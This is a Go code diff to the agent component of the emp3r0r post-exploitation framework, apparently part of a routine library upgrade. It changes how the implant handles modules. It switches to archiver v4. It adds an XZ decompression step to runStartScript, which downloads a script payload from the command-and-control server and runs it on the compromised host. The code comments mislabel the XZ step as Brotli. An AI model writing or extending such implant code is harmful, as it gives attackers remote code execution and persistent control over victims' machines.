@@ -1,7 +1,9 @@
 package agent
 
 import (
+	"bytes"
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"path/filepath"
@@ -9,7 +11,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archiver/v3"
+	"github.com/mholt/archiver/v4"
 )
 
 // moduleHandler downloads and runs modules from C2
@@ -62,7 +64,7 @@ func downloadAndVerifyModule(tarball, checksum string) error {
 
 func extractAndRunModule(modDir, tarball string) error {
 	os.RemoveAll(modDir)
-	if err := archiver.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
+	if err := util.Unarchive(tarball, RuntimeConfig.AgentRoot); err != nil {
 		return fmt.Errorf("unarchive module tarball: %v", err)
 	}
 
@@ -93,7 +95,7 @@ func processModuleFiles(modDir string) error {
 		libsTarball := filepath.Join(modDir, "libs.tar.xz")
 		if util.IsExist(libsTarball) {
 			os.RemoveAll(filepath.Join(modDir, "libs"))
-			if err := archiver.Unarchive(libsTarball, modDir); err != nil {
+			if err := util.Unarchive(libsTarball, modDir); err != nil {
 				return fmt.Errorf("unarchive %s: %v", libsTarball, err)
 			}
 		}
@@ -102,11 +104,37 @@ func processModuleFiles(modDir string) error {
 }
 
 func runStartScript(startScript string) (string, error) {
+	// Download the script payload
 	payload, err := DownloadViaCC(startScript, "")
 	if err != nil {
-		return "", fmt.Errorf("downloading %s: %v", startScript, err)
+		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
 
-	log.Printf("Running %s:\n%s...", startScript, payload[:100])
-	return RunModuleScript(payload)
+	// Decompress the payload using Brotli
+	decompressedPayload, err := decompressXZ(payload, startScript)
+	if err != nil {
+		return "", err
+	}
+
+	log.Printf("Running %s:\n%s...", startScript, decompressedPayload[:100])
+	return RunModuleScript(decompressedPayload)
+}
+
+// decompressXZ handles decompression of a payload.
+func decompressXZ(payload []byte, source string) ([]byte, error) {
+	r := bytes.NewReader(payload)
+
+	// Wrap the reader with Brotli decompressor
+	decompressor, err := archiver.Xz{}.OpenReader(r)
+	if err != nil {
+		return nil, fmt.Errorf("decompressing %s: %w", source, err)
+	}
+	defer decompressor.Close()
+
+	// Read all decompressed data
+	decompressedPayload, err := io.ReadAll(decompressor)
+	if err != nil {
+		return nil, fmt.Errorf("reading decompressed %s: %w", source, err)
+	}
+	return decompressedPayload, nil
 }
